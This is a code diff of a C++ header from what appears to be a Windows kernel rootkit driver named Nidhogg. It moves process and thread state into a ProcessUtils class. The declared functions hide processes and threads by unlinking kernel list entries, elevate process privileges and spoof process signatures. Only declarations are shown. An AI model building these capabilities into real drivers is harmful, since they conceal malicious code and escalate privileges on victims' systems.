@@ -4,6 +4,7 @@
 extern "C" {
 	#include "WindowsTypes.hpp"
 }
+#include "NidhoggCommon.h"
 
 // Definitions.
 constexpr SIZE_T MAX_PIDS = 256;
@@ -15,7 +16,7 @@ constexpr SIZE_T PROCESS_VM_READ = 0x10;
 constexpr SIZE_T PROCESS_VM_OPERATION = 0x8;
 
 struct ProtectedProcessesList {
-	int PidsCount;
+	ULONG PidsCount;
 	ULONG Processes[MAX_PIDS];
 };
 
@@ -25,7 +26,7 @@ struct HiddenProcess {
 };
 
 struct HiddenProcessList {
-	int PidsCount;
+	ULONG PidsCount;
 	HiddenProcess Processes[MAX_PIDS];
 };
 
@@ -35,51 +36,61 @@ struct ProcessSignature {
 	UCHAR SignatureSigner;
 };
 
-struct ProcessGlobals {
-	ProtectedProcessesList ProtectedProcesses;
-	HiddenProcessList HiddenProcesses;
-	FastMutex Lock;
-
-	void Init() {
-		HiddenProcesses.PidsCount = 0;
-		ProtectedProcesses.PidsCount = 0;
-		Lock.Init();
-	}
-};
-inline ProcessGlobals pGlobals;
-
 struct ThreadsList {
-	int TidsCount;
+	ULONG TidsCount;
 	ULONG Threads[MAX_TIDS];
 };
 
-struct ThreadGlobals {
+class ProcessUtils {
+private:
+	FastMutex ThreadsLock;
 	ThreadsList ProtectedThreads;
-	FastMutex Lock;
+	ProtectedProcessesList ProtectedProcesses;
+	HiddenProcessList HiddenProcesses;
+	FastMutex ProcessesLock;
 
-	void Init() {
-		ProtectedThreads.TidsCount = 0;
-		Lock.Init();
+	bool AddHiddenProcess(PLIST_ENTRY entry, DWORD pid);
+	PLIST_ENTRY GetHiddenProcess(DWORD pid);
+	void RemoveListLinks(PLIST_ENTRY current);
+	void AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target);
+
+public:
+	void* operator new(size_t size) {
+		return ExAllocatePoolWithTag(NonPagedPool, size, DRIVER_TAG);
 	}
-};
-inline ThreadGlobals tGlobals;
 
-// Prototypes.
-bool FindThread(ULONG tid);
-bool AddThread(ULONG tid);
-bool RemoveThread(ULONG tid);
-bool FindProcess(ULONG pid);
-bool AddProcess(ULONG pid);
-bool RemoveProcess(ULONG pid);
-bool AddHiddenProcess(PLIST_ENTRY entry, DWORD pid);
-PLIST_ENTRY GetHiddenProcess(DWORD pid);
-NTSTATUS ElevateProcess(ULONG pid);
-NTSTATUS SetProcessSignature(ProcessSignature* ProcessSignature);
-void RemoveListLinks(PLIST_ENTRY current);
-void AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target);
-NTSTATUS UnhideProcess(ULONG pid);
-NTSTATUS HideProcess(ULONG pid);
+	void operator delete(void* p) {
+		ExFreePoolWithTag(p, DRIVER_TAG);
+	}
+
+	ProcessUtils();
+	~ProcessUtils();
+
+	void ClearProtectedThreads();
+	bool FindThread(ULONG tid);
+	bool AddThread(ULONG tid);
+	bool RemoveThread(ULONG tid);
+	void QueryProtectedThreads(ThreadsList* list);
+	NTSTATUS HideThread(ULONG tid);
+
+	void ClearProtectedProcesses();
+	void ClearHiddenProcesses();
+	bool FindProcess(ULONG pid);
+	bool AddProcess(ULONG pid);
+	bool RemoveProcess(ULONG pid);
+	void QueryProtectedProcesses(ProtectedProcessesList* list);
+	NTSTATUS ElevateProcess(ULONG pid);
+	NTSTATUS SetProcessSignature(ProcessSignature* ProcessSignature);
+	NTSTATUS UnhideProcess(ULONG pid);
+	NTSTATUS HideProcess(ULONG pid);
+
+	FastMutex GetProcessesLock() { return this->ProcessesLock; }
+	FastMutex GetThreadsLock() { return this->ThreadsLock; }
+	ULONG GetProtectedProcessesCount() { return this->ProtectedProcesses.PidsCount; }
+	ULONG GetProtectedThreadsCount() { return this->ProtectedThreads.TidsCount; }
+};
+
+inline ProcessUtils* NidhoggProccessUtils;
+
 OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
 OB_PREOP_CALLBACK_STATUS OnPreOpenThread(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
-NTSTATUS HideThread(ULONG tid);
-
